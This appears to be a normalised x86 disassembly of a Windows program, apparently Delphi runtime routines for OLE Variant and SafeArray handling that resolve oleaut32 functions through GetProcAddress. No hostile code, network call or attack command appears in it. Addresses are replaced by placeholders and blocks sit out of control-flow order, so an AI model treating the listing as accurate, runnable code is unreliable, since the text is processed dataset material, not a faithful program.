add [ eax ] al
add [ eax ] al
add [ eax + 0x40004671 ] dl
sub_40d104
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40d16c
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d173
retn
mov eax sub_40ccb4
call sub_403d3c
mov eax r-xdata
call sub_403d64
cmp [ rw-data ] 0x0
je r-xdata
call sub_40b940
call sub_40ba44
call sub_40c6f0
call sub_40c288
mov eax rw-data
mov edx r-xdata
call sub_403fe4
sub_40d1a4
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
mov ax [ ebp + 0x18 ]
push eax
mov ax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call VariantChangeType
mov eax 0x80004001
jmp r-xdata
pop ebp
retn 0x14
sub_40d1f8
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d252
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404218
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_407ee4
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d259
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
sub_40d264
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d2be
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404218
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_4091d8
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d2c5
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
sub_40d2d0
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d32a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404218
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_4091ac
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d331
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
sub_40d33c
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d396
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404218
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_40a9f0
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d39d
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
sub_40d3a8
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d402
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404218
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_409204
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d409
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
sub_40d414
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_40d481
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_404218
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
call sub_407fd0
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
cmp [ ebp - 0x1 ] 0x1
cmc
sbb eax eax
mov edx [ ebp + 0x14 ]
mov [ edx ] ax
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d488
lea eax [ ebp - 0x8 ]
call sub_403f90
retn
sub_40d494
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40d4f4
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_409160
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_4047bc
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d4fb
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
sub_40d504
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40d564
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_40a1b0
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_4047bc
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d56b
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
sub_40d574
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40d5d8
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
cmp [ ebp + 0x8 ] 0x1
sbb eax eax
inc eax
lea ecx [ ebp - 0x4 ]
xor edx edx
call sub_40806c
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x14 ]
call sub_4047bc
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d5df
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
sub_40d608
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx ebx
mov ecx [ ebp + 0x8 ]
cmp [ ecx - 0x4 ] 0x0
je r-xdata
mov eax edx
pop ebx
pop ebp
retn
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
call GetProcAddress
mov edx eax
test edx edx
jne r-xdata
mov edx ebx
sub_40d634
push ebp
mov ebp esp
push ecx
push r-xdata
call GetModuleHandleA
mov [ ebp - 0x4 ] eax
push ebp
mov edx sub_40d1a4
mov eax r-xdata
call sub_40d608
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d1d4
mov eax r-xdata
call sub_40d608
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d1d4
mov eax r-xdata
call sub_40d608
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d1e0
mov eax r-xdata
call sub_40d608
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d1e0
mov eax r-xdata
call sub_40d608
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d1e0
mov eax r-xdata
call sub_40d608
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d1e0
mov eax r-xdata
call sub_40d608
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d1e0
mov eax r-xdata
call sub_40d608
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d1e0
mov eax r-xdata
call sub_40d608
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d1e0
mov eax r-xdata
call sub_40d608
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d1e0
mov eax r-xdata
call sub_40d608
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d1e0
mov eax r-xdata
call sub_40d608
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d1ec
mov eax r-xdata
call sub_40d608
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d1f8
mov eax r-xdata
call sub_40d608
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d264
mov eax r-xdata
call sub_40d608
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d2d0
mov eax r-xdata
call sub_40d608
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d33c
mov eax r-xdata
call sub_40d608
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d3a8
mov eax r-xdata
call sub_40d608
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d414
mov eax r-xdata
call sub_40d608
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d494
mov eax r-xdata
call sub_40d608
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d504
mov eax r-xdata
call sub_40d608
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d574
mov eax r-xdata
call sub_40d608
pop ecx
mov [ rw-data ] eax
pop ecx
pop ebp
retn
sub_40d940
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40d965
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d96c
retn
sub_40df58
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40dfa2
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a90
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b284
call sub_4039cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dfa9
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
sub_40dfac
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40e03b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_40fc9c
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_40fc9c
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405a90
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2c0
call sub_4039cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e042
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_403fb4
retn
sub_40e048
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e092
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a90
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b284
call sub_4039cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e099
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
sub_40e09c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40e12b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_40fc9c
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_40fc9c
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405a90
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2c0
call sub_4039cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e132
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_403fb4
retn
sub_40e138
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e182
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a90
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b284
call sub_4039cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e189
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
sub_40e18c
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40e3d1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
cmp eax 0x8002000a
jg r-xdata
sub eax 0x8002000b
je r-xdata
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405a90
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b284
call sub_4039cc
jmp r-xdata
sub eax 0x2
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405a90
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b284
call sub_4039cc
jmp r-xdata
cmp eax 0x80020005
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e3d8
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_403fb4
lea eax [ ebp - 0x20 ]
mov edx 0x8
call sub_403fb4
retn
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405a90
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b284
call sub_4039cc
jmp r-xdata
sub eax 0x50001
je r-xdata
sub eax 0x80020008
je r-xdata
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405a90
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b284
call sub_4039cc
jmp r-xdata
sub eax 0x49
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a90
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b284
call sub_4039cc
jmp r-xdata
dec eax
je r-xdata
call sub_40df58
jmp r-xdata
sub eax 0x80004001
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405a90
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b284
call sub_4039cc
jmp r-xdata
jmp r-xdata
call sub_40e048
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405a90
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b284
call sub_4039cc
jmp r-xdata
sub eax 0xbffe
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0xb
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x2c ] 0x0
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_40aa7c
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0xb
lea eax [ ebp - 0x38 ]
push eax
push 0x2
lea edx [ ebp - 0x40 ]
mov eax [ rw-data ]
call sub_405a90
mov ecx [ ebp - 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2c0
call sub_4039cc
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405a90
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b284
call sub_4039cc
jmp r-xdata
jmp r-xdata
sub_40e3ec
push ebx
test eax eax
je r-xdata
pop ebx
retn
mov ebx eax
sub ebx 0x80020005
je r-xdata
mov eax edx
mov edx ecx
call sub_40dfac
jmp r-xdata
sub ebx 0x5
je r-xdata
mov eax edx
mov edx ecx
call sub_40e09c
jmp r-xdata
jmp r-xdata
call sub_40e18c
sub_40e420
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e46a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a90
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b284
call sub_4039cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e471
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
sub_40e488
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_40e4b8
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_40e4b8
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_40e514
push ebp
mov ebp esp
add esp 0xfffffce8
push ebx
push esi
push edi
mov [ ebp - 0x304 ] eax
mov eax [ ebp - 0x304 ]
test [ eax + 0x1 ] 0x20
jne r-xdata
mov eax [ ebp - 0x304 ]
mov ax [ eax ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_40e3e0
mov eax [ ebp - 0x304 ]
push eax
call VariantClear
call sub_40e3e0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x304 ]
test ah 0x40
je r-xdata
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x308 ] eax
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x308 ] eax
jmp r-xdata
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x308 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_40e488
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
mov eax esi
mov [ ebp - 0x318 ] eax
mov eax [ ebp - 0x318 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetLBound
call sub_40e3e0
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetUBound
call sub_40e3e0
mov eax [ ebp - 0x318 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x318 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov eax ebx
call sub_40e4b8
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x314 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayPtrOfIndex
call sub_40e3e0
mov eax [ ebp - 0x314 ]
call sub_40e70c
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
sub_40e690
push ebx
push esi
push ecx
mov ebx eax
mov si [ ebx ]
cmp si 0x14
jae r-xdata
cmp si 0x100
jne r-xdata
push ebx
call VariantClear
call sub_40e3e0
jmp r-xdata
cmp si 0x101
jne r-xdata
mov [ ebx ] 0x0
lea eax [ ebx + 0x8 ]
call sub_403f90
jmp r-xdata
pop edx
pop esi
pop ebx
retn
test si 0x2000
je r-xdata
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax esi
call sub_4100f8
test al al
je r-xdata
mov eax ebx
call sub_40e514
jmp r-xdata
push ebx
call VariantClear
call sub_40e3e0
mov edx ebx
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
jmp r-xdata
sub_40e728
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_40e758
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_40e758
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_40e7b4
push ebp
mov ebp esp
add esp 0xfffffce0
push ebx
push esi
push edi
mov [ ebp - 0x308 ] ecx
mov ebx edx
mov [ ebp - 0x304 ] eax
test [ ebx + 0x1 ] 0x20
jne r-xdata
mov ax [ ebx ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_40e3e0
push ebx
mov eax [ ebp - 0x304 ]
push eax
call VariantCopy
call sub_40e3e0
test ah 0x40
je r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x314 ] eax
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x314 ] eax
jmp r-xdata
lea eax [ ebp - 0x300 ]
push eax
mov eax [ ebp - 0x310 ]
push eax
push 0xc
call SafeArrayCreate
mov esi eax
test esi esi
jne r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x314 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x304 ]
call sub_40e70c
mov eax [ ebp - 0x304 ]
mov [ eax ] 0x200c
mov eax [ ebp - 0x304 ]
mov [ eax + 0x8 ] esi
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
call sub_40e138
mov eax esi
mov [ ebp - 0x320 ] eax
mov eax [ ebp - 0x320 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetLBound
call sub_40e3e0
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetUBound
call sub_40e3e0
mov eax [ ebp - 0x320 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x320 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_40e728
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
push ebp
mov eax ebx
call sub_40e758
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x318 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayPtrOfIndex
call sub_40e3e0
lea eax [ ebp - 0x31c ]
push eax
lea eax [ ebp - 0x100 ]
push eax
push esi
call SafeArrayPtrOfIndex
call sub_40e3e0
mov eax [ ebp - 0x318 ]
mov edx eax
mov eax [ ebp - 0x31c ]
call [ ebp - 0x308 ]
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40e988
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov di [ esi ]
cmp di 0x14
jae r-xdata
mov eax ebx
call sub_40e690
cmp di 0x100
jne r-xdata
push esi
push ebx
call VariantCopy
call sub_40e3e0
jmp r-xdata
cmp di 0x101
jne r-xdata
mov [ ebx ] 0x100
xor eax eax
mov [ ebx + 0x8 ] eax
lea eax [ ebx + 0x8 ]
mov edx [ esi + 0x8 ]
call sub_403fe4
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
test di 0x2000
je r-xdata
mov [ ebx ] di
mov eax [ esi + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax edi
call sub_4100f8
test al al
je r-xdata
mov ecx sub_40e980
mov edx esi
mov eax ebx
call sub_40e7b4
jmp r-xdata
push esi
push ebx
call VariantCopy
call sub_40e3e0
push 0x0
mov ecx esi
mov edx ebx
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x28 ]
jmp r-xdata
sub_40ea34
push ebx
push esi
mov ebx edx
mov esi eax
cmp esi ebx
je r-xdata
pop esi
pop ebx
retn
test [ ebx ] 0xbfe8
jne r-xdata
mov edx ebx
mov eax esi
call sub_40e988
test [ esi ] 0xbfe8
je r-xdata
mov eax [ ebx ]
mov [ esi ] eax
mov eax [ ebx + 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebx + 0x8 ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0xc ]
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax esi
call sub_40e690
sub_40ea78
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_404670
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x6
call sub_40e3ec
pop ebx
pop ebp
retn 0x8
sub_40eab0
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_404670
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x7
call sub_40e3ec
pop ebx
pop ebp
retn 0x8
sub_40eae8
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40eb9e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404670
push eax
push 0x0
push 0x400
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0xb
call sub_40e3ec
mov al [ rw-data ]
sub al 0x1
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40eba5
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403fb4
retn
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebx ]
call sub_404218
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
call sub_407aa8
mov edx [ ebp - 0x4 ]
